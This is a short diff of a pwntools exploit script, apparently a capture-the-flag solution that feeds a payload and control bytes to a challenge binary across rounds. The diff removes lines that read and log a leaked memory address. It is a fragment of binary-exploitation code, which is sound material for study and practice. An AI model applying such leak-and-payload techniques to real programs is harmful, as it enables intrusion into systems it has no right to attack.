@@ -359,9 +359,6 @@ p.sendafter(b'WTML!\n', payload)
 p.sendlineafter(b'quit]?\n', b"\0")
 p.sendlineafter(b'tag?\n', b"\x01")
 # round 2
-p.recvuntil(b'</\x01')
-Unknow_leak = u64(p.recv(6)+ b'\0\0')
-log.info('leak :' + hex(Unknow_leak))
 p.sendlineafter(b'quit]?\n', b"A")
 p.sendlineafter(b'tag?\n', b"B")
 
